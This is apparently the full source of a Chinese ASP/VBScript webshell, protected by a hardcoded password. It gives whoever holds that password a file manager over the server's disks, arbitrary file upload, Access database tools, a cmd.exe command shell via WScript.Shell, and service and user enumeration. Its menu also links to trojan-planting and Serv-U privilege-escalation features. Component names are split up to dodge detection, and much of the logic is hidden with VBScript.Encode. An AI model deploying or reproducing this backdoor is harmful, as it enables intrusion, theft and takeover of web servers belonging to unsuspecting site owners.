<%@ LANGUAGE = VBScript.Encode %>
<%
Server.ScriptTimeout=50000
Response.Buffer =False
On Error Resume Next
mName = "����С��-վ������-�޸İ汾"
UserPass        = "huohu"  '��½����
URL             = Request.ServerVariables("URL")
ServerIP        = Request.ServerVariables("LOCAL_ADDR")
Action          = Request("Action")
RootPath        = Server.MapPath(".")
WWWRoot         = Server.MapPath("/")
FolderPath      = Request("FolderPath")
FName           = Request("FName")
BackUrl         = "<meta http-equiv='refresh' content = '2; URL=?Action=Show1File' >"

sub ShowErr()
  If Err Then
    Response.Write"<br><a href='javascript:history.back()'><br>&nbsp;" & Err.Description & "</a><br>"
    Err.Clear:Response.Flush
  End If		
end sub


Dim ObT(13,2)
ObT(0,0) = "Sc"&DEfd&"rip"&DEfd&"ting"&DEfd&".F"&DEfd&"ileS"&DEfd&"yste"&DEfd&"mObj"&DEfd&"ect"
  ObT(0,2) = "�ļ��������"
ObT(1,0) = "w"&DEfd&"sc"&DEfd&"ri"&DEfd&"pt.s"&DEfd&"he"&DEfd&"ll"
  ObT(1,2) = "������ִ�����"
ObT(2,0) = "ADOX.Catalog"
  ObT(2,2) = "ACCESS�������"
ObT(3,0) = "JRO.JetEngine"
  ObT(3,2) = "ACCESSѹ�����"
ObT(4,0) = "Scrip"&DEfd&"ting"&DEfd&".D"&DEfd&"icti"&DEfd&"onary" 
  ObT(4,2) = "�������ϴ��������"
ObT(5,0) = "Adodb.connection"
  ObT(5,2) = "���ݿ��������"
ObT(6,0) = "Ado"&DEfd&"d"&DEfd&"b"&DEfd&".S"&DEfd&"tre"&DEfd&"am"
  ObT(6,2) = "�������ϴ����"
ObT(7,0) = "SoftArtisans.FileUp"
  ObT(7,2) = "SA-FileUp �ļ��ϴ����"
ObT(8,0) = "LyfUpload.UploadFile"
  ObT(8,2) = "���Ʒ��ļ��ϴ����"
ObT(9,0) = "Persits.Upload.1"
  ObT(9,2) = "ASPUpload �ļ��ϴ����"
ObT(10,0) = "JMail.SmtpMail"
  ObT(10,2) = "JMail �ʼ��շ����"
ObT(11,0) = "CDONTS.NewMail"
  ObT(11,2) = "����SMTP�������"
ObT(12,0) = "SmtpMail.SmtpMail.1"
  ObT(12,2) = "SmtpMail�������"
ObT(13,0) = "Microsoft.XMLHTTP"
  ObT(13,2) = "���ݴ������"

For i=0 To 13
	Set T=Server.CreateObject(ObT(i,0))
	If -2147221005 <> Err Then
	  IsObj=True
	Else
	  IsObj=false
	  Err.Clear
	End If
	Set T=Nothing
	ObT(i,1)=IsObj
Next


Function RePath(S)
  RePath=Replace(S,"\","\\")
End Function

Function RRePath(S)
  RRePath=Replace(S,"\\","\")
End Function

If FolderPath<>"" then
  Session("FolderPath")=RRePath(FolderPath)
End If

If Session("FolderPath")="" Then
  FolderPath=RootPath
  Session("FolderPath")=FolderPath
End if

Function MainForm()
  SI="<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
  SI=SI&"<input type=""hidden"" name=""Action"">"
  SI=SI&"<input type=""hidden"" name=""FName"">"
  SI=SI&"</form>"
  SI=SI&"<table width='100%' height='100%'  border='0' cellpadding='0' cellspacing='0' bgcolor='menu'>"
  SI=SI&"<tr><td height='30' colspan='2'>"
  SI=SI&"<table width='100%' height='25'  border='0' cellpadding='0' cellspacing='0'>"
  SI=SI&"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
  SI=SI&"<tr><td width='60' align='center'>��ַ����</td><td>"
  SI=SI&"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
  SI=SI&"</td><td width='60' align='center'><input name='Submit' type='submit' value='ת��'>" 
  SI=SI&"</td></tr></form></table></td></tr><tr><td width='160'>"
  SI=SI&"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='2' scrolling='yes'></iframe></td>"
  SI=SI&"<td>"
  SI=SI&"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1' scrolling='yes'></iframe>"
  SI=SI&"</td></tr></table>"
  Response.Write SI
End Function


Function MainMenu()
  SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
  SI=SI&"<tr><td height='5'></td></tr>"
  SI=SI&"<tr><td>&nbsp;"
  SI=SI&"FSO�ļ�����ģ��"
  SI=SI&"</td></tr>"
  If Not ObT(0,1) Then
    SI=SI&"<tr><td height='20'></td></tr>"
  Else
  Set ABC=New LBF:SI=SI&ABC.ShowDriver():Set ABC=Nothing
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='javascript:ShowFolder(""C:\\Progra~1"")'>C:\Progra~1</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='javascript:ShowFolder(""C:\\Docume~1"")'>C:\Docume~1</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>վ���Ŀ¼</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>������Ŀ¼</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>�½�Ŀ¼</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='?Action=EditFile' target='FileFrame'>�½��ı�</a>"
  SI=SI&"</td></tr>"
  End If
  Response.Write SI:SI=""
  
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='?Action=UpFile' target='FileFrame'>�ļ��ϴ�ģ��</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;"
  SI=SI&"���ݿ����ģ��"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>����MDB�ļ�</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='?Action=DbManager' target='FileFrame'>���ݿ����</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;&nbsp;&nbsp;&nbsp;"
  SI=SI&"<a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\data.mdb")&""",""CompactMdb"")'>ѹ��MDB�ļ�</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;"
  SI=SI&"<a href='?Action=Cmd1Shell' target='FileFrame'>������ģ��</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;"
  SI=SI&"<a href='?Action=Course' target='FileFrame'>ϵͳ�����б�</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;"
  SI=SI&"<a href='?Action=ServerInfo' target='FileFrame'>��������Ϣ</a>"
  SI=SI&"</td></tr>"
  
      SI=SI&"<tr><td height='20'>&nbsp;"
  SI=SI&"<a href='?Action=kmuma' target='FileFrame'>����ľ��</a>"
  SI=SI&"</td></tr>"
  
    SI=SI&"<tr><td height='20'>&nbsp;"
  SI=SI&"<a href='?Action=Servu' target='FileFrame'>ֱ����Ȩ</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;"
  SI=SI&"<a href='?Action=pl' target='FileFrame'>��������</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;"
  SI=SI&"<a href='?Action=Logout' target='_top'>�˳���¼</a>"
  SI=SI&"</td></tr>"
  SI=SI&"<tr><td height='20'>&nbsp;"
  SI=SI&"<a href='http://www.xxoxx.net' target='_blank'>����С��</a>"
  SI=SI&"</td></tr>"  
  SI=SI&"<tr><td height='20'>"
  SI=SI&"<br>&nbsp;ASP<br>&nbsp;by ASP QQ:����С��</a>"
  SI=SI&"</td></tr>"
  SI=SI&"</table>"
  Response.Write SI : SI=""
End Function

Function Course()
  SI="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
  SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>ϵͳ�û������</td></tr>"
  on error resume next
  for each obj in getObject("WinNT://.")
  err.clear
  if OBJ.StartType="" then
  SI=SI&"<tr>"
  SI=SI&"<td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"
  SI=SI&obj.Name
  SI=SI&"</td><td bgcolor=""#FFFFFF"">&nbsp;" 
  SI=SI&"ϵͳ�û�(��)"
  SI=SI&"</td></tr>"
  SI0="<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">&nbsp;</td></tr>" 
  end if
  if OBJ.StartType=2 then lx="�Զ�"
  if OBJ.StartType=3 then lx="�ֶ�"  
  if OBJ.StartType=4 then lx="����"
  if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
  SI1=SI1&"<tr><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[��������:"&lx&"]<font color=#FF0000>&nbsp;"&obj.path&"</font></td></tr>"
  else
  SI2=SI2&"<tr><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF"">&nbsp;"&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[��������:"&lx&"]<font color=#008000>&nbsp;"&obj.path&"</font></td></tr>"
  end if
  next
  Response.Write SI&SI0&SI1&SI2&"</table>"
End Function

Function ServerInfo()
  SI="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
  SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>�����������Ϣ</td></tr>"
  SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>��������</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&request.serverVariables("SERVER_NAME")&"</td></tr>"
  SI=SI&"<form method=post action='http://www.ip138.com/index.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������IP</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"
  SI=SI&"<input type='text' name='ip' size='15' value='"&Request.ServerVariables("LOCAL_ADDR")&"'style='border:0px'><input type='submit' value='��ѯ'style='border:0px'><input type='hidden' name='action' value='2'></td></tr></form>"
  SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������ʱ��</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&now&"&nbsp;</td></tr>"
  SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>������CPU����</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"</td></tr>"
  SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>����������ϵͳ</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("OS")&"</td></tr>"
  SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>WEB�������汾</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr>"
  For i=0 To 13
    SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&ObT(i,0)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,1)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,2)&"</td></tr>"
  Next
  Response.Write SI
End Function

Function DownFile(Path)
  Response.Clear
  Set OSM = CreateObject(ObT(6,0))
  OSM.Open
  OSM.Type = 1
  OSM.LoadFromFile Path
  sz=InstrRev(path,"\")+1
    Response.AddHeader "Content-Disposition", "attachment; filename=" & Mid(path,sz)
    Response.Charset = "UTF-8"
    Response.ContentType = "application/octet-stream"
    Response.BinaryWrite OSM.Read
    Response.Flush
  OSM.Close
  Set OSM = Nothing
End Function


Function HTMLEncode(S)
  if not isnull(S) then
    S = replace(S, ">", "&gt;")
    S = replace(S, "<", "&lt;")
    S = replace(S, CHR(39), "&#39;")
    S = replace(S, CHR(34), "&quot;")
    S = replace(S, CHR(20), "&nbsp;")
    HTMLEncode = S
  end if
End Function

Function UpFile()
  If Request("Action2")="Post" Then
    Set U=new UPC : Set F=U.UA("LocalFile")
	UName=U.form("ToPath")
    If UName="" Or F.FileSize=0 then
      SI="<br>�������ϴ�����ȫ·����ѡ��һ���ļ��ϴ�!"
    Else
        F.SaveAs UName
        If Err.number=0 Then
          SI="<center><br><br><br>�ļ�"&UName&"�ϴ��ɹ���</center>"
		End if
	End If
	Set F=nothing:Set U=nothing
	SI=SI&BackUrl
	Response.Write SI
	ShowErr()
	Response.End
  End If
    SI="<br><br><br><table border='0' cellpadding='0' cellspacing='0' align='center'>"
    SI=SI&"<form name='UpForm' method='post' action='"&URL&"?Action=UpFile&Action2=Post' enctype='multipart/form-data'>"
    SI=SI&"<tr><td>"
    SI=SI&"�ϴ�·����<input name='ToPath' value='"&RRePath(Session("FolderPath")&"\newup.asp")&"' size='40'>&nbsp;"
    SI=SI&"<input name='LocalFile' type='file'  size='25'>"
    SI=SI&"<input type='submit' name='Submit' value='�ϴ�'>"
    SI=SI&"</td></tr></form></table>"
  Response.Write SI
End Function

Function Cmd1Shell()
  If Request("SP")<>"" Then Session("ShellPath") = Request("SP")
  ShellPath=Session("ShellPath")
  if ShellPath="" Then ShellPath = "cmd.exe"
  if Request("wscript")="yes" then
  checked=" checked"
  else
  checked=""
  end if
  If Request("cmd")<>"" Then DefCmd = Request("cmd")
  SI="<form method='post'><input name='cmd' Style='width:92%' class='cmd' value='"&DefCmd&"'><input type='submit' value='ִ��'>"
  SI=SI&"<textarea Style='width:100%;height:500;' class='cmd'>"
  If Request.Form("cmd")<>"" Then
  if Request.Form("wscript")="yes" then
  Set CM=CreateObject(ObT(1,0))
  Set DD=CM.exec(ShellPath&" /c "&DefCmd)
  aaa=DD.stdout.readall
  SI=SI&aaa
  else%>
  <object runat=server id=ws scope=page classid="clsid:72C24DD5-D70A-438B-8A42-98424B88AFB8"></object>
  <object runat=server id=ws scope=page classid="clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B"></object>
  <object runat=server id=fso scope=page classid="clsid:0D43FE01-F093-11CF-8940-00A0C9054228"></object>
  <%#@~^cR0AAA==d.KnswwkVP{~/D-+MRhCawlD4`rm:9 O6DJ*@#@&P~/mVsPSdR"EU~v?tns^nCY4'rP&1PrP[,fWZsN~[,J~@*,JPL~/.K+s2ok^+BPT~~PMEn#@#@&P,?nO,0/~x,Z.+mOr8N+1Y`r?1.kaYrxTRor^+?HdY:r(%nmDJ*@#@&P~jY~WwrVV^a,'PWdcr2+	P6Owk^+Pv/.P+swok^+S~8~PwCVk+~,Tb@#@&P,lClxjD-+M C:HJ3	mW[nvWok^n^macIlNzV^b@#@&P~Wwksn^m6c/VK/+@#@&~P;l^V~0dGcfnVO+wksnv/yPnswok^nBPPME#@#@&P,jq{?([mlC@#@&PPUN,k0@#@&~PAx9P(0@#@&,Pjq{jqLm4.vF&b'r@!&YaDl.l@*J@#@&P,jq{?([r?u3dS·����@!bUw!YP	Ch+{BUnvP-C^En'EE[Utns^nlO4LJvPUOHVn{BSkNDt={!uB@*[	4d2p[x(dwpJ@#@&~~?&'Uq'J@!r	w;Y,OXa+xv1t+^V(WaB,Um:n{BS/mMkaOB,\CV!+xvH+/EE[1t+1VnNLJ@*jm.raY ?4nV^@!&WKD:@*E@#@&~P"nkwG	/RMkDnPUq@#@&Ax[~wEx1OkKx@#@&@#@&s!x1YrWU~;DnlDnH94cKmYtb~@#@&~P,j&'E@!4M@*@!(D@*E@#@&P~PU+O~;P',/DlY68LmD`64Pcy~T#*~@#@&P~~;RZ.nmYn`rKMW-bND'tk1.WkWWYc9nOcrSA9AccRZI9lDl,?GE.^'EPL~nmY4b@#@&P~~U+OP;~{PHKY4kxT@#@&~P,qWPAD. 	E:(nD{!P:4nx@#@&,P~P~j&PxPU(PLPKCDtP'~r�����ɹ�"E@#@&~,P3	N,q0@#@&,~PUqx?&[$C13jMsP@#@&P,~]+kwKxd+ 	MkO+,jq@#@&3U9P0;U1YrW	~@#@&@#@&s!xmDkKUP;WhwmmO\94`hCY4
#@#@&(WPgWDP64PcZ~q#,Ptx@#@&,PP~jY~Z{/M+CD+}4LmDcr(Kc&B!bb,@#@&,~P,PP; /WswmmOfCOm4C/~JhDG-bN+.xtk^DKdK0Oc9YR}SA9Acc !pfCOmP?K;D1+'r'KlDtLJSn.G7k[+MxHbm.GkW0O x+OR}JAf$ccc!iGlDCPUW;D1+xE,[nmOt@#@&dUnOP;'gWOtrUT@#@&2^d+@#@&~~U+Y~oUrxZMnmYn}4N+mD`}8Kv!SF*#@#@&,Pq6~sUrRwrs+A6b/O/cKmY4#,Ptx@#@&,PP~jY~Z{/M+CD+}4LmDcr(Kc&B!bb,@#@&,~P,PP; /WswmmOfCOm4C/~JhDG-bN+.xtk^DKdK0Oc9YR}SA9Acc !pfCOmP?K;D1+'r'KlDtLJSn.G7k[+MxHbm.GkW0O x+OR}JAf$ccc!iGlDCPUW;D1+xE,[nmOtLJ{(CVJ@#@&i?nY~/{1GY4rxT@#@&~,PPoj}R9+^nD+obVPnmY4@#@&isjrcHG-sk^nPhlY4'E{(l0JSnCO4@#@&P,3Vk+@#@&,PP~j&'E@!1n	YnM@*@!4D@*@!(.@*@!4.@*���ݿ�r[KCDt[rû�з��֣�@!z1+xDn.@*rP@#@&72..cx;:(nD{F@#@&,P2U[,qW@#@&~,?nDPw?r{1KOtbxL@#@&2U[,q0@#@&P,q0,3.Dcx!:8+.xZPPtU@#@&P~~,?qxE@!mnxDnM@*@!(D@*@!4M@*@!8D@*���ݿ�J'nmY4'rѹ���ɹ���@!z1nxD+D@*E@#@&,PAx[P(W@#@&~PU('Uq'$mm3i.^@#@&P,]/2Kxk+RqDbO+,?(@#@&2U[,sE	^YbWx@#@&r0,D;;+dOvJ2lkdJ*'E;k+D2Ck/EPD4x@#@&PU+/kkKU`rhn4yl+[skxrbP{Pjkn.nm/k@#@&P~~,P~P`]Sv#@#@&,P+U[,kW@#@&@#@&qW,?//bW	cJS+8 m [hbxJ*~@!@*Pjkn.nm/kPPtnU
@#@&~P&WP"+5;/Y oKDh`rKm/dr#,@!@*,Jr~K4+U@#@&P~~,q0,]+$E+kO sKDs`EnCdkJbP{~jk+.Km//~P4+U@#@&~,P~,PU+/kkKU`rhn4yl+[skxrbP{Pjkn.nm/k@#@&P~~,P~IdwKxdncI+[rM+^Y,i"S@#@&P,PPAVkn@#@&d~D/2G	/+cADbY+r~��֤~ʧ��P��r@#@&P~P~3	N~q6@#@&,P@#@&,P2sd@#@&P,~,?({J@!m+	Y.PkYzV'vWKxY dk.+)8+26E@*@!4.@*~@!(D@*Pzjn,@!8.@*P@!8.@*J@#@&,~,Pj&'Uq[r@!6GDsPCmDkGU{BJLiId[JE~h+DtKNxB2GkYv@*r@#@&,P~~Uq'j(LJ~���룺@!bUaEO,xm:+{BhC/kB~YHwnxEwlkdhKDNE~dk.+{Bq*v@*r@#@&P,~PUqxj&[J~'	4dwp~@!kUaEDPYHwxBkE8:bYv~7lV!n'E��¼B@*,@!&0KDs@*~@!&^xO+M@*J@#@&~~,P@#@&~,P~IdaWUk+cDbY~?&@#@&P,P~~M+/aGxk+RS.rYJ@!/2lU~kYzVxNb/2smX)UG	+@*@!k^Mk2DP^lxTEmL+{LC\m/^.bwY,dD1'tDO2)Jz1W;xOq+RXFHn/cmGhJmVr^0RC/aaQk[{F+%GWG+,LVGoK'q+@*@!zk^DbwY@*@!&/al	@*E@#@&~,2UN,(0@#@&~~"+/2G	/nRAU9@#@&Ax9Pq6@#@&@#@&wEUmDkGU,f4tCxmo+Mcb@#@&P,?5VjOM'PDbh`"+5;/Y oKDh`rj$VjDDr##@#@&,~f(?OD{In5!+/D sKD:vE94UYMJb@#@&@#@&P~?&x?&[E@!Dl4sn,hrND4{Bl!EPP(WM[+M'v!EP^n^V/aCmbxo{vTB,mVswC[9kUo{v!E@*E@#@&PPj({?([r@!6W.sP	l:'E94wW.:EPhnDtW9xBaW/Dv~l1YbWU'vv@*J@#@&,~?&'j(LJ@!O.@*@
!ON,AbNO4'EF!ZB,4+bo4Y{B+{E@*PLU4kwi���ݿ����Ӵ�=@!&Y9@*r@#@&P~j&'jqLE@!DN@*@!bxw;O,xC:xEf8UYMBPkYHs+{BAk9Y4lWG!E~\mVExEJr[G4jY.'rJE@*@!&Y9@*E@#@&PPj({?([r@!DN~Sk9Yt{B+TB,lskTxxv1+xDnDE@*@!kns+1Y,xC:nxE?OD~OxEPGU1tlUL'vDO!DU,s!VVG4UODvW2YbWUd]/+^nmD+N&U[+XTc\CV;n*B@*@!K2YbWU~7lV;n{Oq@*���Ӵ�ʾ��@!&KwObW	@*@!KwDrW	P-l^EnxZ@*b1^+k/����@!JG2YbW	@*E@#@&~,?('U([r@!G2DkWU~7lsEx8@*\k?$V����@!JWaOkKx@*@!KwOrKxP7CV!+'y@*\XU;^����@!&W2ObWU@*@!GwDkGU,\ls;'f@*Gjg����@!&KwDkW	@*r@#@&,Pjq{?('r@!WaOkKxP7CsE' F@*ORj5S�﷨RO@!&WaYrG	@*@!G2DkGx,-mV;'W@*��ʾ����@!JWaOkKx@*@!KwOrKxP7CV!+'l@*�������@!zKwDkGx@*E@#@&~PU('Uq'E@!WwOrKx~\ms!+x+@*ɾ������@!zWaYbGx@*@!GwDkGU,\l^;+{G@*�޸�����@!&GwDkKx@*@!G2DkGx,-l^EnxR@*�����ݱ�@!&GaYrW	@*r@#@&,PUq'UqLE@!KwOkKx~-mVEx,@*ɾ���ݱ�@!zK2OkKx@*@!GwOrKx~\msE'qT@*����ֶ�@!zG2DkGx@*@!KwObW	P\mV!n'8F@*ɾ���ֶ�@!JW2ObWx@*E@#@&PPU(x?&[r@!GwOrKx~\msE'q+@*��ȫ��ʾ@!zG2DkGx@*@!J/n^+1Y@*@!zD[@*@!zOD@*J@#@&,P?&x?&[J@!rUw!Y,xC:nxEb^YbGxEPOza+'v4bN[+	v,\C^E'BG4tCxmonDE@*@!r	wED~xm:+{vKlT+EPO
X2n{B4k9[+	B~-mVEnxEFv@*r@#@&P~Uq{?qLJ@!OD@*@!ON,tnrTtY{v&ZB@*LU8/aiUpJ��������)@!&DN@*J@#@&P,?(xUq[E@!DN@*@!bUaEO,xm:+{BU5VUY.B,/Oz^+'EAk9Yt=*{!EP7lsEnxrJE[U5VUY.'rJJ@*@!JY[@*r@#@&P~Uq{?qLJ@!ON,lskTxxv1+xDnDE@*@!bU2EDPDX2+xvkE8:bOB,xCh'Bj;(:rYE~7ls!+{Bִ��B,W	^VbmV'EDnO!Dx,94;t+1Vc#E@*@!zON@*E@#@&~PU('Uq'E@!zY.@*@!zWWMh@*@!&Dl(V+@*@!k2l	PrN{BC81B@*@!&/alx@*E@#@&,P"+dwGUk+ MrYPj(=?qxEr@#@&@#@&~,qW,Sx`G4UOD*@**!,K4n	@#@&,~@#@&PPUnOP;W	xxZ.nmYnr(%+1Yc6(K`XSZ#b@#@&~,ZG	xcrwx,94UY.@#@&P~jYP"d';Wx	 6wxUm4+hCv T#,@#@&,Pj({?q'E@!YC4^n@*@!OMP4+kTtDxBy*vP~o^G^WD{va;ZZ;//B@*@!DN@*��@!8.@*��@!&Y9@*J@#@&~~"/R\G7+okMdDP@#@&P,fW,4rVPHWDP]dc2W6@#@&,PP,(WP"/vJPb$JA{P5h3J*'EPzAS3E,Y4+	@#@&d~,Kgl:'"d`rK)Ad2mHzH2rb@#@&PP,~~PUq{?([E@!DN~l^ro	'^n	Y+.@*@!l~tMn6'vNl7l/1Db2Y=s;V^?5sUYDvEJGIrh~Pb~SAP,J'Pglh+LETrJSq*B@*,~9+sPY@!Jl@*@!4M@*J@#@&,~P,P~?&'j(LJ@!m~tM+0{v%l7lkm.k2O=s;V^j;^?O.vJJj3d2/K,M,s]}H,$JLKgC:[ETrJSq*B@*r'Kgl:'E@!Jl@*@!&Y[@*r@#@&P,~PAx[~&0P@#@&,P~P"dcHG7+g+6DP@#@&P,SGWaP@#@&,P?OP"/'gGOtbxT@#@&P~j&'jqLE@!J
Y.@*@!zYC8^+@*J@#@&,P]/aWxk+c	DbYnPUqlj&'Jr@#@&iPP@#@&7P,@#@&d~P@#@&&0~SU`U;sjDD#@*qZPPtU@#@&@#@&P,q0,S;C/`J+6Ycj$V?D.~+##{Ed+^+1YEPO4x@#@&,~P,?(xUq[Eִ����䣺EL?5VUOM@#@&,P,P?Y,]/{Z.+mYn6(L+1O`rbNK[8R"+1W.NdnDJb@#@&~P,P]dcWwnU,?5VUOM~/Kx	~FBF@#@&P,P~sg']dcsksNkRZK;UY@#@&,P~P]/{IdR"nmKD[/KExO@#@&P~P,]kRKmo?k.+{+!@#@&~P,P/G!xY{]/cnlTnjk.+@#@&~P~~h1xIk nmon/KExO@#@&P~P,Kmon{D;E/DcJhlL+r#@#@&,PP,(0,nlTn@!@*rJ,K4+U~hlL+{/V	ocKmo+b@#@&P~P,(6PKmo'JrP}.PhlL+{!~P4+x,KlT+'8@#@&P,P,qWPKCT+@*ng~K4+U~hlonxh1@#@&,~,P(6Phlo@*8~K4+UP"/ C(/W^;YwlTnxnmo@#@&P~~,?('U([r@!OC(V+@*@!DD~trTtO{ lP4TmKsWM':m1m^^1@*@!D[@*@!zY9@*Ed,P@#@&~P~~wW.P	x!,YG~w1Oq@#@&P~P,~,?nDPwVN{Ik sb+sNkR(O:`	b@#@&PP,~~PUq{?([E@!DN~l^ro	'v^xYn.E@*E[ws9RHm:[J@!zD[@*r@#@&P,P~~,?+D~s^N'	GOtbxT@#@&P~~,1n6D@#@&,P~~Uq'j(LJ@!zD.@*J@#@&@#@&PP,PGGPqtrVPHGD`Ik 2K0PK.~IkR~WW#~)	N~ZK;xD@*T@#@&dP~/KEUY{/KEUDO8@#@&iP,$o1WsWM'E:As2w3sr@#@&i~~?&'Uq'J@!OM@*@!Y9~4TmGsKD':^1m^m1@*@!0G	Y,0l1+{vhbxLNbxLdE@*6@!&0KxY@*@!&Y9@*rP~@#@&7,PoWM~k{!~PKPsHR8@#@&P,~,P~
,P&0P~o1GVKDxJ[2o3w2sr~K4+x=$LmKVKDxJ:olsXslE)AVdn=Ao^G^W.'r:As3w2wJ)Ax9~k6@#@&P,P~~,PP&WP"Z'8~Ptx@#@&~P~~,P~P,~P;Ws(	0Wxu:HJ2	^KNnvIk`k*#@#@&P,P~P,P~3^/+@#@&P,PP,~~P,P,ZGV(U6WxC:\SAx^G9+`Jn6YcIkcb#Sl!*#@#@&P,~P,P~PAx[~&0@#@&7P,PPU(x?&[r@!ON~8TmGVK.'r[$L1WVG.LJ@*JL/KV(	0K[J@!zD[@*r@#@&d,PHnXY@#@&7P,?q{j([r@!JY.@*E@#@&P~P,~P"/ \K\+HnXY@#@&,~,PJKWa@#@&i@#@&7I/2W	/n qDkDnPUq)U(xJr@#@&d@#@&7j$VjYMxCD:s3	ZW[nv?5VUOM#@#@&@#@&PP,PU('Uq'J@!Y.@*@!YN,^W^/wmUxJLsg_q[E~mVro	xmxOnM@*��¼����J'];[E[	8kwIҳ�룺r[hlo[r&JLnH@#@&P~~,q0,K1@*FP:4nx@#@&,P~P~~Uqx?&'JLx8dai[U8kwI@!m~4Dn6'ELl7lk^DbwO)wEssU;VUODvJJr'j;^?DD'JEEBFbB@*��ҳ@!zm@*'U(/wI@!mP4DW{B%m\m/mMkaO)wEsVU;sjDD`rEJL?;^jODLJrJSJ'KmonO8'J*B@*��һҳ@!Jl@*'U(/2ir@#@&P~,P,Pq6PhCo@*0P:tnU=?w{KlT+ORl3Vk+=?2'qlAx[PbW@#@&P~~,PPoGMPr'U2,KG,?a_%@#@&,~P,P~P,qW~b@*ng~K4+x,3akDPwW.@#@&~,P~P,~P&0~r{nlLn,K4+	@#@&P~,P,PP,?&x?&[r[r[U8kwir@#@&,PP,~~P,2^/n@#@&~,P~P,~PUqxj&[J@!C,t.+6xELC7lkmDbwDls!Vs?$VjOM`JrE[U;VUO.[rJr~E[r'r#v@*r'kLJ@!&m@*[U8kwIJ@#@&,P~,P,PPAx9~q6@#@&P,P~~,1+XO@#
